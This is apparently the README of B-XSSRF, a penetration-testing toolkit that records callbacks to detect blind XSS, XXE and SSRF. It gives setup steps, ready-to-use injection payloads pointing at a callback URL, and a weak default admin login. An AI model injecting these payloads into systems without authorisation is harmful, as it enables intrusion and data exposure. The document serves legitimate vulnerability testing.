<h1 align="center">
  <br>
  <a href=""><img src="https://github.com/hack-parthsharma/BXSSRF/blob/master/img/icon.png" width="70" height="70" alt="B-XSSRF"></a>
  <br>
  B-XSSRF
  <br>
</h1>

<h4 align="center">Toolkit to detect and keep track on Blind XSS, XXE & SSRF</h4>

### SETUP
- Upload the files to your server.
- Create a Database and upload <b>database.sql</b> file to it.
- Change the <b>DB Credentials</b> in <b>db.php</b> file.
- Ready.

### USAGE
BLIND XSS 

```
<embed src="http://mysite.com/bxssrf/request.php">
<script src="http://mysite.com/bxssrf/request.php">
```
BLIND XXE

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://mysite.com/bxssrf/request.php"> %ext;
]>
<r></r>
```
SSRF

```
GET /testssrf.php=http://mysite.com/bxssrf/request.php

```
### DEFAULT CREDENTIALS
```
USER : admin@test.com
PASS : 123456
```
